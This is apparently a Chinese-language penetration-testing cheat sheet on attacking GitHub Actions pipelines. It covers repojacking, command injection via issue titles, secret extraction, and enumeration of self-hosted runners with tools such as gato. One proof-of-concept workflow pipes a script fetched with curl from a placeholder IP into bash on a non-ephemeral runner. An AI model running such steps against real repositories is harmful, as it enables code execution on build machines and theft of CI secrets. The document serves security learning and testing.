# CI/CD - GitHub Actions

GitHub Actions 是 GitHub 内置的 CI/CD 自动化工具，允许你直接从 GitHub 仓库构建、测试和部署代码。它运行由代码推送、拉取请求或手动触发等事件触发的工作流 (Workflows)。

## 练习环境 (Lab)

* [messypoutine/gravy-overflow](https://github.com/messypoutine/gravy-overflow/) - 一个 GitHub Actions 供应链 CTF / Goat 练习场。

## 默认操作 (Default Action)

GitHub Actions 的配置文件位于 `.github/workflows/` 目录下。

你可以根据其触发器 (`on`) 指令判断该 Action 是否构建拉取请求：

```yaml
on:
  push:
    branches:
      - master
  pull_request:
```

如需在构建拉取请求的 Action 中运行命令，请添加 `run` 指令。

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Command execution
    steps:
    - run: echo whoami"
```

`workflow_dispatch` 是 GitHub Actions 中的一个特殊触发器，允许你从 GitHub UI 或通过 GitHub API 手动触发工作流。

```yml
name: example
on:
  workflow_dispatch:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: windows-2019

    steps:
      - name: Execute
        run: |
          whoami
```

## 配置错误的 Action (Misconfigured Actions)

分析仓库以查找配置错误的 GitHub Actions。

* [synacktiv/octoscan](https://github.com/synacktiv/octoscan) - Octoscan 是针对 GitHub Actions 工作流的静态漏洞扫描器。
* [boostsecurityio/poutine](https://github.com/boostsecurityio/poutine) - Poutine 是一款安全扫描器，用于检测仓库构建流水线中的配置错误和漏洞。它支持解析来自 GitHub Actions 和 GitLab CI/CD 的 CI 工作流。

    ```ps1
    # 使用 Docker
    $ docker run ghcr.io/boostsecurityio/poutine:latest

    # 分析本地仓库
    $ poutine analyze_local .

    # 分析远程 GitHub 仓库
    $ poutine -token "$GH_TOKEN" analyze_repo messypoutine/gravy-overflow

    # 分析 GitHub 组织中的所有仓库
    $ poutine -token "$GH_TOKEN" analyze_org messypoutine

    # 分析自托管 GitLab 实例中的所有项目
    $ poutine -token "$GL_TOKEN" -scm gitlab -scm-base-uri https://example.com org/repo
    ```

![GitHub-Actions-Attack-Diagram](https://raw.githubusercontent.com/jstawinski/GitHub-Actions-Attack-Diagram/refs/heads/main/GitHub%20Actions%20Attack%20Diagram.svg)

### 仓库劫持 (Repository Hijacking)

当 Action 使用了不存在的 Action、GitHub 用户名或组织时，会发生此类情况。

```yaml
- uses: non-existing-org/checkout-action
```

> :warning: 为了防止仓库劫持 (repojacking)，GitHub 采用了一种安全机制：在重命名或删除所有者账号前的一周内，如果仓库的克隆次数达到 100 次，则不允许注册该仓库原有的名称。[GitHub Actions 蠕虫：通过 Actions 依赖树攻陷 GitHub 仓库 - Asi Greenholts](https://www.paloaltonetworks.com/blog/prisma-cloud/github-actions-worm-dependencies/)

### 不受信任的输入评估 (Untrusted Input Evaluation)

如果 Action 将不受信任的输入作为其 `run` 指令的一部分进行动态评估，则可能容易受到命令注入攻击：

```yaml
jobs:
  print_issue_title:
    runs-on: ubuntu-latest
    name: Print issue title
    steps:
    - run: echo "${{github.event.issue.title}}"
```

### 提取敏感变量与密钥 (Extract Sensitive Variables and Secrets)

**变量 (Variables)** 用于非敏感配置数据。它们只能由该环境上下文中的 GitHub Actions 使用变量上下文进行访问。

**密钥 (Secrets)** 是加密的环境变量。它们只能由该环境上下文中的 GitHub Actions 使用密钥 (secret) 上下文进行访问。

```yml
jobs:
  build:
    runs-on: ubuntu-latest
    environment: env
    steps:
      - name: Access Secrets
        env:
            SUPER_SECRET_TOKEN: ${{ secrets.SUPER_SECRET_TOKEN }}
        run: |
            echo SUPER_SECRET_TOKEN=$SUPER_SECRET_TOKEN >> local.properties
```

* [synacktiv/gh-hijack-runner](https://github.com/synacktiv/gh-hijack-runner) - 一个用于创建虚假 GitHub 运行器并劫持流水线作业以泄露 CI/CD 密钥的 Python 脚本。

## 自托管运行器 (Self-Hosted Runners)

GitHub Actions 的自托管运行器是你管理和维护的一台机器，用于运行源自 GitHub 仓库的工作流。与运行在 GitHub 基础设施上的托管运行器不同，自托管运行器运行在你自己的基础设施上。这允许对运行器环境的硬件、操作系统、软件和安全性进行更多控制。

扫描公开的 GitHub 组织以查找自托管运行器：

* [AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X) - Gato (Github Attack TOolkit) 的分支版本 —— 极致版。
* [praetorian-inc/gato](https://github.com/praetorian-inc/gato) - GitHub Actions 流水线枚举与攻击工具。

    ```ps1
    gato -s enumerate -t targetOrg -oJ target_org_gato.json
    ```

自托管运行器有两种类型：非临时运行器 (non-ephemeral) 和临时运行器 (ephemeral)。

* **临时运行器 (Ephemeral)** 是短寿命的，创建后仅处理一个或有限数量的作业即被终止。它们提供隔离性、可扩展性，并因每个作业都在干净环境中运行而增强了安全性。
* **非临时运行器 (Non-ephemeral)** 是长寿命的，旨在随时间处理多个作业。它们提供一致性和定制性，在不需要重新配置运行器的稳定环境中具有成本效益。

使用 `gato` 识别自托管运行器的类型：

```ps1
gato e --repository vercel/next.js
[+] 认证用户为：swisskyrepo
[+] GitHub Classic PAT 具有以下权限范围：repo, workflow
    - 正在枚举：vercel/next.js!
[+] 该仓库包含一个工作流：build_and_deploy.yml，可能在自托管运行器上执行！
[+] 仓库 vercel/next.js 包含此前在自托管运行器上执行的工作流运行记录！
    - 运行器名称为：nextjs-hel1-22，机器名称为 nextjs-hel1-22，运行器类型为 Default 组中的 repository，具有以下标签：self-hosted, linux, x64, metal
[!] 该仓库包含一个非临时自托管运行器！
[-] 用户只能从该仓库进行拉取，但允许分叉 (forking)！只能进行基于分叉拉取请求 (fork pull-request) 的攻击。
```

在非临时运行器上运行的工作流示例：

```yml
name: POC
on:
  pull_request:
  
jobs:
  security:
    runs-on: non-ephemeral-runner-name

    steps:
      - name: cmd-exec
        run: |
          curl -k https://ip.ip.ip.ip/exec.sh | bash
```

## 参考资料 (References)

* [GITHUB ACTIONS EXPLOITATION: SELF HOSTED RUNNERS - Hugo Vincent - 17/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-self-hosted-runners)
* [GITHUB ACTIONS EXPLOITATION: REPO JACKING AND ENVIRONMENT MANIPULATION - Hugo Vincent - 10/07/2024](https://www.synacktiv.com/publications/github-actions-exploitation-repo-jacking-and-environment-manipulation)
* [GITHUB ACTIONS EXPLOITATION: DEPENDABOT - Hugo Vincent - 06/08/2024](https://www.synacktiv.com/publications/github-actions-exploitation-dependabot)
* [Weaponizing Dependabot: Pwn Request at its finest - Sébastien Graveline - 02/06/2025](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)
